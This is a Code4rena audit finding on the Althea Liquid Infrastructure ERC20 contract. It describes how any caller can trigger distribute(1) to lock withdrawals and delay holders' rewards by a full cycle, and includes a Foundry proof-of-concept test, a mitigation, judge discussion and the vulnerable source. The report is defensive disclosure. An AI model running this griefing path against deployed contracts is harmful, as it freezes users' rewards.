{
  "Title": "[M-02] Malicious users can prevent holders from claiming their rewards during a reward cycle by skipping it.",
  "Content": "\nThe Sponsors noted via discord communication:\n\n    \"The most likely configuration would be roughly weekly or monthly, based on average block times.\"\n\n    \"Althea-L1 will have a mempool, ...\"\n\nThis is important to mention because this issue would not be significant if the minimum time between reward distribution was, for example, 100 blocks; and since there is a mempool, front-running is possible.\n\nThe project holds liquid NFTs, which accumulate rewards. These rewards are used to reward the `erc20` token holders.\nThese rewards are transferred to the `liquiderc20` contract by using the two following functions:\n\n```javascript\n\t function withdrawFromAllManagedNFTs() public {\n        withdrawFromManagedNFTs(ManagedNFTs.length);\n    }\n    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {\n        require(!LockedForDistribution, \"cannot withdraw during distribution\");\n        if (nextWithdrawal == 0) {\n            emit WithdrawalStarted();\n        }\n        uint256 limit = Math.min(\n            numWithdrawals + nextWithdrawal,\n            ManagedNFTs.length\n        );\n        uint256 i;\n        for (i = nextWithdrawal; i < limit; i++) {\n            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(\n                ManagedNFTs[i]\n            );\n            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();\n            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));\n            emit Withdrawal(address(withdrawFrom));\n        }\n        nextWithdrawal = i;\n        if (nextWithdrawal == ManagedNFTs.length) {\n            nextWithdrawal = 0;\n            emit WithdrawalFinished();\n        }\n    }\n```\n\nHowever, the problem here is the following check inside `withdrawFromManagedNFTs`:\n\n```javascript\nrequire(!LockedForDistribution, \"cannot withdraw during distribution\");\n```\n\nEven when there are `0` rewards in the current contract, a malicious user can still call `distribute(1)` to start the distribution process and to set the `LockedForDistribution` boolean to `true`.\n\nThis results in no one being able to call `withdrawFromManagedNFTs` to get the rewards inside the `erc20` contract to distribute, which results in the next reward cycle being after `block.number + MinDistributionPeriod`.\n\n### Proof of Concept\n\nThere are roughly [7000 blocks per day](https://ycharts.com/indicators/ethereum_blocks_per_day), so we will use `(7000 * 30) = 210000 blocks` to mock a distribution period of roughly 1 month.\n\nWe have written a Proof of Concept using Foundry, please follow the instructions provided and read the comments in the PoC for documentation.\n\n<details>\n\n```javascript\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.12;\n// git clone https://github.com/althea-net/liquid-infrastructure-contracts.git\n// cd liquid-infrastructure-contracts/\n// npm install\n// forge init --force\n// vim test/Test.t.sol \n\t// save this test file\n// run using:\n// forge test --match-test \"testGrieveCycles\" -vvvv\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport { LiquidInfrastructureERC20 } from \"../contracts/LiquidInfrastructureERC20.sol\";\nimport { LiquidInfrastructureNFT } from \"../contracts/LiquidInfrastructureNFT.sol\";\nimport { TestERC20A } from \"../contracts/TestERC20A.sol\";\nimport { TestERC20B } from \"../contracts/TestERC20B.sol\";\nimport { TestERC20C } from \"../contracts/TestERC20C.sol\";\nimport { TestERC721A } from \"../contracts/TestERC721A.sol\";\n\ncontract ERC20Test is Test {\n    LiquidInfrastructureERC20 liquidERC20;\n    TestERC20A erc20A;\n    TestERC20B erc20B;\n    TestERC20C erc20C;\n    LiquidInfrastructureNFT liquidNFT;\n    address owner = makeAddr(\"Owner\");\n    address alice = makeAddr(\"Alice\");\n    address bob = makeAddr(\"Bob\");\n    address charlie = makeAddr(\"Charlie\");\n    address delta = makeAddr(\"Delta\");\n    address eve = makeAddr(\"Eve\");\n    address malicious_user = makeAddr(\"malicious_user\");\n    \n    function setUp() public {\n      vm.startPrank(owner);\n      // Create a rewardToken\n      address[] memory ERC20List = new address[](1);\n      erc20A = new TestERC20A();\n      ERC20List[0] = address(erc20A);\n\n      // Create managed NFT\n      address[] memory ERC721List = new address[](1);\n      liquidNFT = new LiquidInfrastructureNFT(\"LIQUID\");\n      ERC721List[0] = address(liquidNFT);\n\n      // Create approved holders\n      address[] memory holderList = new address[](5);\n      holderList[0] = alice;\n      holderList[1] = bob;\n      holderList[2] = charlie;\n      holderList[3] = delta;\n      holderList[4] = eve;\n\n      // Create liquidERC20 and mint liquidERC20 to the approved holders\n      liquidERC20 = new LiquidInfrastructureERC20(\"LiquidERC20\", \"LIQ\", ERC721List, holderList, 210000, ERC20List);\n      liquidERC20.mint(alice, 1e18);\n      liquidERC20.mint(bob, 1e18);\n      liquidERC20.mint(charlie, 1e18);\n      liquidERC20.mint(delta, 1e18);\n      liquidERC20.mint(eve, 1e18);\n\n      // Add threshold and rewardToken to liquidNFT\n      uint256[] memory amountList = new uint256[](1);\n      amountList[0] = 100;\n      liquidNFT.setThresholds(ERC20List, amountList);\n      liquidNFT.transferFrom(owner, address(liquidERC20), 1);\n\n      // Mint 5e18 rewardTokens to liquidNFT\n      erc20A.mint(address(liquidNFT), 5e18);\n      vm.stopPrank();\n    }\n\n    function testGrieveCycles() public {\n      // Go to block 210001, call withdrawFromAllManagedNFTs to get the rewards, and distribute everything to bring the token balance of the reward token to 0. This is just a sanity check.\n      vm.roll(210001);\n      liquidERC20.withdrawFromAllManagedNFTs();\n      liquidERC20.distributeToAllHolders();\n\n      // Go to block ((210000 * 2) + 1).\n      vm.roll(420001);\n\n\t  // Malicious user calls distribute\n      // This makes it temporarily unavailable to withdraw the rewards.\n      vm.prank(malicious_user);\n      liquidERC20.distribute(1);\n \n      // Rewards can't be pulled or withdrawn from the ERC20 contract.\n      vm.expectRevert();\n      vm.prank(owner);\n      liquidERC20.withdrawFromAllManagedNFTs();\n\n      // This sets the next reward period to start at ((210000 * 3) + 1).\n      vm.startPrank(owner);\n      liquidERC20.distributeToAllHolders();\n      liquidERC20.withdrawFromAllManagedNFTs();\n      vm.stopPrank();\n\n      // Alice tried to get the rewards she had earned but could not get them, even with the rewards being in this contract, because the next reward cycle\n      // starts at block ((210000 * 2) + 1).\n      vm.expectRevert();\n      vm.prank(alice);\n      liquidERC20.distributeToAllHolders();\n    }\n}\n```\n\n</details>\n\nAs you can see by running our PoC, a whole month of rewards is unable to be claimed by approved holders due to any person calling the distribute function; even if there are `0` rewards currently able to be distributed to the approved holders. For a project that is built upon rewarding its holders at a fixed period of time, this breaks the core functionality of the project.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nDo not start a distribution cycle if there are no rewards that can be paid out to the approved holders and keep track of the rewards currently held in the `liquidNFT`. Only start reward cycles when this amount that is held in the `liquidNFT` is sent to the `liquidERC20`. This prevents malicious users from sending 1 wei of `rewardTokens` to the `liquidERC20` to maliciously start a distribution cycle.\n\n**[ChristianBorst (Althea) acknowledged and commented via duplicate issue #594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594#issuecomment-1974261475):**\n> I think this is a valid suggestion but does not pose a risk to the protocol. This could enable a malicious owner (which is already a highly trusted role) to avoid distributing revenue to holders before minting new tokens.\n>\n> There is no restriction on distribution frequency, a user could call `distributeToAllHolders()` multiple times every single block without withdrawing rewards from the `ManagedNFTs` if they want to pay the gas to do so. Even if a user decides to pay all that gas, nothing is preventing any other accounts from withdrawing rewards from the `ManagedNFTs` and performing yet another distribution to actually distribute the revenue to the holders.\n>\n> I think that there is an argument to restrict owner misbehavior by forcing withdrawal before distribution, but the recommended mitigation strategy would introduce a new DoS vector to the protocol.\n\n**[0xA5DF (judge) commented via duplicate issue #594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594#issuecomment-1976438581):**\n> > There is no restriction on distribution frequency, a user could call `distributeToAllHolders()` multiple times every single block.\n> \n> There is actually a restriction, you have to wait `MinDistributionPeriod` before calling it again ([code](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/84d65bad60cbc87c73dd43906a6fb46b1ba3830b/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L201-L204)).\n> \n> Issue [#119](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119), is more clear and the mitigation makes more sense (ensuring `withdrawFromManagedNFTs()` was completed before starting distribution). Given that the minimum period is going to be about a week or a month I think this is a valid medium issue.\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119#issuecomment-1985816209):**\n > Marking as medium, as this is _mostly_ only a temporarily grief of funds, and this would only happen if nobody calls `withdrawFromManagedNFTs()`.\n\n**[bronze_pickaxe (warden) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119#issuecomment-1986192939):**\n > @0xA5DF - We agree this should be of medium severity because it's a temporary grief of funds.\n> \n> As you correctly mentioned in your comment, this only happens if nobody calls `withdrawFromManagedNFTs`. Therefore, we ask you to consider de-duping the following dupes because they both describe another attack path, starting from someone calling `withdrawFromManagedNFTs`:\n> - [#594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594)\n> - [#227](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/227)\n> \n> [#594](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/594) and [#227](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/227)  both describe the following attack path in the wrong:\n> - calling `withdrawFromManagedNFTs`\n> \t- if only one NFT distributes the reward, both these issues are invalid since they will still be fully distributed.\n> - calling `distribute()`\n> This is not the same as our report since the attack path that leads to skipping a reward cycle with no distribution is:\n> - `distribute()`\n> - `withdrawFromManagedNFTs`\n> There is no mention of calling `distribute()` before `withdrawFromManagedNFTs`.\n> \n> [#218](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/218) correctly identified the attack vector of calling `withdrawFromManagedNFTs` and `distribute()` in the wrong order, being:\n> 1.` distribute()`\n> 2.` withdrawFromManagedNFTs`\n> This report correctly mentioned the attack path, unlike the other two.\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/119#issuecomment-1986830696):**\n > I agree that they don't fully identify the impact and don't describe the issue well, but it seems like they're touching on it:\n> \n> - Holders must wait for another `MinDistributionPeriod` (30 days) to receive their shares from other assets of `ManagedNFTs`. their assets will freeze for another 30 days.\n> \n> - This leads to a scenario where it the user might trigger `withdrawFromManagedNFTs` for a portion of managed NFTs, and then attacker calls distribute which block another call to `withdrawFromManagedNFTs` from finishing its work. That way only partial amount of rewards will be distributed since `withdrawFromManagedNFTs` did not pull all rewards.\n> \n> I'll give them partial credit.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-02-althea-liquid-infrastructure",
  "Code": [
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "//SPDX-License-Identifier: Apache-2.0\npragma solidity 0.8.12; // Force solidity compliance\n\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./LiquidInfrastructureNFT.sol\";\n\n/**\n * @title Liquid Infrastructure ERC20\n * @author Christian Borst <christian@althea.systems>\n *\n * @dev An ERC20 contract used to earn rewards from managed LiquidInfrastructreNFTs.\n *\n * A LiquidInfrastructureNFT typically represents some form of infrastructure involved in an Althea pay-per-forward network\n * which frequently receives payments from peers on the network for performing an automated service (e.g. providing internet).\n * This LiquidInfrastructureERC20 acts as a convenient aggregation layer to enable dead-simple investment in real-world assets\n * with automatic revenue accrual. Simply by holding this ERC20 owners are entitled to revenue from the network represented by the token.\n *\n * Revenue is gathered from managed LiquidInfrastructureNFTs by the protocol and distributed to token holders on a semi-regular basis,\n * where there is a minimum number of blocks required to elapse before a new payout to token holders.\n *\n * Minting and burning of this ERC20 is restricted if the minimum distribution period has elapsed, and it is reenabled once a new distribution is complete.\n */\ncontract LiquidInfrastructureERC20 is\n    ERC20,\n    ERC20Burnable,\n    Ownable,\n    ERC721Holder,\n    ReentrancyGuard\n{\n    event Deployed();\n    event DistributionStarted();\n    event Distribution(address recipient, address[] tokens, uint256[] amounts);\n    event DistributionFinished();\n    event WithdrawalStarted();\n    event Withdrawal(address source);\n    event WithdrawalFinished();\n    event AddManagedNFT(address nft);\n    event ReleaseManagedNFT(address nft, address to);\n\n    address[] private distributableERC20s;\n    uint256[] private erc20EntitlementPerUnit;\n    address[] private holders;\n\n    /**\n     * @notice This is the current version of the contract. Every update to the contract will introduce a new\n     * version, regardless of anticipated compatibility.\n     */\n    uint256 public constant Version = 1;\n\n    /**\n     * @notice This collection holds the managed LiquidInfrastructureNFTs which periodically generate revenue and deliver\n     * the balances to this contract.\n     */\n    address[] public ManagedNFTs;\n\n    /**\n     * @notice This collection holds the whitelist for accounts approved to hold the LiquidInfrastructureERC20\n     */\n    mapping(address => bool) public HolderAllowlist;\n\n    /**\n     * @notice Holds the block of the last distribution, used for limiting distribution lock ups\n     */\n    uint256 public LastDistribution;\n\n    /**\n     * @notice Holds the minimum number of blocks required to elapse before a new distribution can begin\n     */\n    uint256 public MinDistributionPeriod;\n\n    /**\n     * @notice When true, locks all transfers, mints, and burns until the current distribution has completed\n     */\n    bool public LockedForDistribution;\n\n    /**\n     * @dev Holds the index into `holders` of the next account owed the current distribution\n     */\n    uint256 internal nextDistributionRecipient;\n\n    /**\n     * @dev Holds the index into `ManagedNFTs` of the next contract to withdraw funds from\n     */\n    uint256 private nextWithdrawal;\n\n    /**\n     * Indicates if the account is approved to hold the ERC20 token or not\n     * @param account the potential holder of the token\n     */\n    function isApprovedHolder(address account) public view returns (bool) {\n        return HolderAllowlist[account];\n    }\n\n    /**\n     * Adds `holder` to the list of approved token holders. This is necessary before `holder` may receive any of the underlying ERC20.\n     * @notice this call will fail if `holder` is already approved. Call isApprovedHolder() first to avoid mistakes.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function approveHolder(address holder) public onlyOwner {\n        require(!isApprovedHolder(holder), \"holder already approved\");\n        HolderAllowlist[holder] = true;\n    }\n\n    /**\n     * Marks `holder` as NOT approved to hold the token, preventing them from receiving any more of the underlying ERC20.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function disapproveHolder(address holder) public onlyOwner {\n        require(isApprovedHolder(holder), \"holder not approved\");\n        HolderAllowlist[holder] = false;\n    }\n\n    /**\n     * Implements the lock during distributions, adds `to` to the list of holders when needed\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        require(!LockedForDistribution, \"distribution in progress\");\n        if (!(to == address(0))) {\n            require(\n                isApprovedHolder(to),\n                \"receiver not approved to hold the token\"\n            );\n        }\n        if (from == address(0) || to == address(0)) {\n            _beforeMintOrBurn();\n        }\n        bool exists = (this.balanceOf(to) != 0);\n        if (!exists) {\n            holders.push(to);\n        }\n    }\n\n    /**\n     * Implements an additional lock on minting and burning, ensuring that supply changes happen after any potential distributions\n     */\n    function _beforeMintOrBurn() internal view {\n        require(\n            !_isPastMinDistributionPeriod(),\n            \"must distribute before minting or burning\"\n        );\n    }\n\n    /**\n     * Removes `from` from the list of holders when they no longer hold any balance\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        bool stillHolding = (this.balanceOf(from) != 0);\n        if (!stillHolding) {\n            for (uint i = 0; i < holders.length; i++) {\n                if (holders[i] == from) {\n                    // Remove the element at i by copying the last one into its place and removing the last element\n                    holders[i] = holders[holders.length - 1];\n                    holders.pop();\n                }\n            }\n        }\n    }\n\n    /**\n     * Performs a distribution to all of the current holders, which may trigger out of gas errors if there are too many holders\n     */\n    function distributeToAllHolders() public {\n        uint256 num = holders.length;\n        if (num > 0) {\n            distribute(holders.length);\n        }\n    }\n\n    /**\n     * Begins or continues a distribution, preventing transfers, mints, and burns of the token until all rewards have been paid out\n     *\n     * @notice distributions may only begin once every MinDistributionPeriod.\n     *\n     * @param numDistributions the number of distributions to process in this execution\n     */\n    function distribute(uint256 numDistributions) public nonReentrant {\n        require(numDistributions > 0, \"must process at least 1 distribution\");\n        if (!LockedForDistribution) {\n            require(\n                _isPastMinDistributionPeriod(),\n                \"MinDistributionPeriod not met\"\n            );\n            _beginDistribution();\n        }\n\n        uint256 limit = Math.min(\n            nextDistributionRecipient + numDistributions,\n            holders.length\n        );\n\n        uint i;\n        for (i = nextDistributionRecipient; i < limit; i++) {\n            address recipient = holders[i];\n            if (isApprovedHolder(recipient)) {\n                uint256[] memory receipts = new uint256[](\n                    distributableERC20s.length\n                );\n                for (uint j = 0; j < distributableERC20s.length; j++) {\n                    IERC20 toDistribute = IERC20(distributableERC20s[j]);\n                    uint256 entitlement = erc20EntitlementPerUnit[j] *\n                        this.balanceOf(recipient);\n                    if (toDistribute.transfer(recipient, entitlement)) {\n                        receipts[j] = entitlement;\n                    }\n                }\n\n                emit Distribution(recipient, distributableERC20s, receipts);\n            }\n        }\n        nextDistributionRecipient = i;\n\n        if (nextDistributionRecipient == holders.length) {\n            _endDistribution();\n        }\n    }\n\n    /**\n     * Determines if the minimum distribution period has elapsed, which is used for restricting\n     * minting and burning operations\n     */\n    function _isPastMinDistributionPeriod() internal view returns (bool) {\n        // Do not force a distribution with no holders or supply\n        if (totalSupply() == 0 || holders.length == 0) {\n            return false;\n        }\n\n        return (block.number - LastDistribution) >= MinDistributionPeriod;\n    }\n\n    /**\n     * Prepares this contract for distribution:\n     * - Locks the contract\n     * - Calculates the entitlement to protocol-held ERC20s per unit of the LiquidInfrastructureERC20 held\n     */\n    function _beginDistribution() internal {\n        require(\n            !LockedForDistribution,\n            \"cannot begin distribution when already locked\"\n        );\n        LockedForDistribution = true;\n\n        // clear the previous entitlements, if any\n        if (erc20EntitlementPerUnit.length > 0) {\n            delete erc20EntitlementPerUnit;\n        }\n\n        // Calculate the entitlement per token held\n        uint256 supply = this.totalSupply();\n        for (uint i = 0; i < distributableERC20s.length; i++) {\n            uint256 balance = IERC20(distributableERC20s[i]).balanceOf(\n                address(this)\n            );\n            uint256 entitlement = balance / supply;\n            erc20EntitlementPerUnit.push(entitlement);\n        }\n\n        nextDistributionRecipient = 0;\n        emit DistributionStarted();\n    }\n\n    /**\n     * Unlocks this contract at the end of a distribution\n     */\n    function _endDistribution() internal {\n        require(\n            LockedForDistribution,\n            \"cannot end distribution when not locked\"\n        );\n        delete erc20EntitlementPerUnit;\n        LockedForDistribution = false;\n        LastDistribution = block.number;\n        emit DistributionFinished();\n    }\n\n    /**\n     * Convenience function that allows the contract owner to distribute when necessary and then mint right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute\n     */\n    function mintAndDistribute(\n        address account,\n        uint256 amount\n    ) public onlyOwner {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        mint(account, amount);\n    }\n\n    /**\n     * Allows the contract owner to mint tokens for an address\n     *\n     * @notice minting may only occur when a distribution has happened within MinDistributionPeriod blocks\n     */\n    function mint(\n        address account,\n        uint256 amount\n    ) public onlyOwner nonReentrant {\n        _mint(account, amount);\n    }\n\n    /**\n     * Convenience function that allows a token holder to distribute when necessary and then burn their tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burn()\n     */\n    function burnAndDistribute(uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burn(amount);\n    }\n\n    /**\n     * Convenience function that allows an approved sender to distribute when necessary and then burn the approved tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burnFrom()\n     */\n    function burnFromAndDistribute(address account, uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burnFrom(account, amount);\n    }\n\n    function withdrawFromAllManagedNFTs() public {\n        withdrawFromManagedNFTs(ManagedNFTs.length);\n    }\n\n    /**\n     * Performs withdrawals from the ManagedNFTs collection, depositing all token balances into the custody of this contract\n     * @param numWithdrawals the number of withdrawals to perform\n     */\n    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {\n        require(!LockedForDistribution, \"cannot withdraw during distribution\");\n\n        if (nextWithdrawal == 0) {\n            emit WithdrawalStarted();\n        }\n\n        uint256 limit = Math.min(\n            numWithdrawals + nextWithdrawal,\n            ManagedNFTs.length\n        );\n        uint256 i;\n        for (i = nextWithdrawal; i < limit; i++) {\n            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(\n                ManagedNFTs[i]\n            );\n\n            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();\n            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));\n            emit Withdrawal(address(withdrawFrom));\n        }\n        nextWithdrawal = i;\n\n        if (nextWithdrawal == ManagedNFTs.length) {\n            nextWithdrawal = 0;\n            emit WithdrawalFinished();\n        }\n    }\n\n    /**\n     * Adds a LiquidInfrastructureNFT contract to the ManagedNFTs collection\n     * @notice this contract must already be the owner of the `nftContract` before this function is called\n     *\n     * @param nftContract the LiquidInfrastructureNFT contract to add to ManagedNFTs\n     */\n    function addManagedNFT(address nftContract) public onlyOwner {\n        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);\n        address nftOwner = nft.ownerOf(nft.AccountId());\n        require(\n            nftOwner == address(this),\n            \"this contract does not own the new ManagedNFT\"\n        );\n        ManagedNFTs.push(nftContract);\n        emit AddManagedNFT(nftContract);\n    }\n\n    /**\n     * Transfers a LiquidInfrastructureNFT contract out of the control of this contract\n     * @notice LiquidInfrastructureNFTs only hold a single token with a specific id (AccountId), this function\n     * only transfers the token with that specific id\n     *\n     * @param nftContract the NFT to release\n     * @param to the new owner of the NFT\n     */\n    function releaseManagedNFT(\n        address nftContract,\n        address to\n    ) public onlyOwner nonReentrant {\n        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);\n        nft.transferFrom(address(this), to, nft.AccountId());\n\n        // Remove the released NFT from the collection\n        for (uint i = 0; i < ManagedNFTs.length; i++) {\n            address managed = ManagedNFTs[i];\n            if (managed == nftContract) {\n                // Delete by copying in the last element and then pop the end\n                ManagedNFTs[i] = ManagedNFTs[ManagedNFTs.length - 1];\n                ManagedNFTs.pop();\n                break;\n            }\n        }\n        // By this point the NFT should have been found and removed from ManagedNFTs\n        require(true, \"unable to find released NFT in ManagedNFTs\");\n\n        emit ReleaseManagedNFT(nftContract, to);\n    }\n\n    /**\n     * Allows the owner to overwrite the list of ERC20s which may be distributed from ManagedNFTs to the holders\n     *\n     * @param _distributableERC20s  The new list value to set\n     */\n    function setDistributableERC20s(\n        address[] memory _distributableERC20s\n    ) public onlyOwner {\n        distributableERC20s = _distributableERC20s;\n    }\n\n    /**\n     * Constructs the underlying ERC20 and initializes critical variables\n     *\n     * @param _name The name of the underlying ERC20\n     * @param _symbol The symbol of the underlying ERC20\n     * @param _managedNFTs The addresses of the controlled LiquidInfrastructureNFT contracts\n     * @param _approvedHolders The addresses of the initial allowed holders\n     * @param _distributableErc20s The addresses of ERC20s which should be distributed from ManagedNFTs to holders\n     */\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        address[] memory _managedNFTs,\n        address[] memory _approvedHolders,\n        uint256 _minDistributionPeriod,\n        address[] memory _distributableErc20s\n    ) ERC20(_name, _symbol) Ownable() {\n        ManagedNFTs = _managedNFTs;\n        LastDistribution = block.number;\n\n        for (uint i = 0; i < _approvedHolders.length; i++) {\n            HolderAllowlist[_approvedHolders[i]] = true;\n        }\n\n        MinDistributionPeriod = _minDistributionPeriod;\n\n        distributableERC20s = _distributableErc20s;\n\n        emit Deployed();\n    }\n}"
    }
  ]
}